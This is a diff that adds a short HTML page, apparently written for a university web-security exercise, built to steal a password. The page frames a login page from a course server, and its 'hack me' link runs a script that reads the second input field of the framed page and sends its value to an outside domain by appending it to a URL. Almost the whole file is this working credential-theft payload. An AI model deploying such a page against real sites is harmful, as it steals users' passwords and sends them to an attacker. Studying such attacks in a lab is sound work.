@@ -1,0 +1,17 @@
+<html>
+
+<a href="#" onclick="hack()">hack me</a>
+
+<iframe src="http://cs336-11.cs.rutgers.edu:3000/login"></iframe>
+
+<script>
+function hack() {
+
+var pass = document.getElementsByTagName('iframe')[0].contentDocument.getElementsByTagName('input')[1].value;
+
+document.location = "http://www.viveks3th.com/" + pass;
+
+}
+</script>
+
+</html>
